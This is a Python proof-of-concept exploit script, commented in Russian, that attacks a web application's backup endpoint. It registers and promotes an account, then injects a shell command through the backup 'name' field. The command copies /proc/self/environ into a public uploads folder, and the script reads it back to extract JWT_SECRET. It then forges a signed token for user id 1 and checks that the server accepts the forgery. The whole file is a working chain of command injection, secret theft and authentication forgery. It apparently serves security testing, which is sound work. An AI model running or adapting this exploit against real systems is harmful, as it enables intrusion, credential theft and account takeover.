# -*- coding: utf-8 -*-
"""Копирует /proc/self/environ в /uploads. Thumbnail на proc отдаёт пустое тело:
ServeContent верит размеру 0. Если JWT_SECRET непустой, скрипт подписывает токен id=1.

    python 08_environ_jwt.py
"""
import base64
import hashlib
import hmac
import json
import time

from _http import Client, parser


def b64(raw: bytes) -> bytes:
    return base64.urlsafe_b64encode(raw).rstrip(b"=")


def forge(secret: str, user_id: int) -> str:
    header = b64(b'{"alg":"HS256","typ":"JWT"}')
    payload = b64(json.dumps({"id": user_id, "exp": 1999999999}, separators=(",", ":")).encode())
    sig = b64(hmac.new(secret.encode(), header + b"." + payload, hashlib.sha256).digest())
    return (header + b"." + payload + b"." + sig).decode()


def main():
    args = parser("Чтение окружения процесса и подпись JWT").parse_args()
    client = Client(args.base)
    stamp = str(int(time.time()))[-6:]
    name = f"env{stamp}"
    email = f"{name}@poc.local"
    password = "Passw0rd!env"
    token = client.register(name, email, password)
    token = client.promote(token, name, email, password)

    outfile = f"environ-{stamp}.txt"
    # cp сохраняет режим 0400 у /proc/self/environ, nginx (uid 101) тогда отвечает 403.
    # Перенаправление создаёт обычный файл с umask процесса.
    status, _, blob = client.call(
        "POST",
        "/api/user/backup",
        token=token,
        body={
            "backup": {
                "name": (
                    f"x; cat /proc/self/environ > /srv/media/uploads/{outfile}; "
                    f"chmod 644 /srv/media/uploads/{outfile} #"
                )
            }
        },
    )
    if status != 200:
        raise SystemExit(f"копирование environ не удалось: {status} {blob[:200]!r}")
    status, _, body = client.call("GET", f"/uploads/{outfile}")
    if status != 200 or b"PATH=" not in body and b"GIN_MODE=" not in body:
        raise SystemExit(f"environ не прочитан: {status} {body[:80]!r}")
    text = body.replace(b"\x00", b"\n").decode("utf-8", "replace")
    interesting = [line for line in text.splitlines() if line.startswith(("JWT_SECRET=", "GIN_MODE=", "DB_PATH="))]
    print("OK environ скопирован в /uploads/" + outfile)
    for line in interesting:
        if line.startswith("JWT_SECRET=") and len(line) > len("JWT_SECRET="):
            print("JWT_SECRET задан, длина", len(line.split("=", 1)[1]))
        else:
            print(line)

    secret = ""
    for line in text.splitlines():
        if line.startswith("JWT_SECRET="):
            secret = line.split("=", 1)[1]
    if not secret:
        print("JWT_SECRET пустой: ключ подписи живёт только в памяти процесса, подделать токен из environ нельзя")
        return

    forged = forge(secret, 1)
    status, who, blob = client.call("GET", "/api/user", token=forged)
    if status != 200:
        raise SystemExit(f"подделанный токен не принят: {status} {blob[:200]!r}")
    print(f"OK подпись сошла за пользователя {who['user']['username']} {who['user']['email']}")


if __name__ == "__main__":
    main()
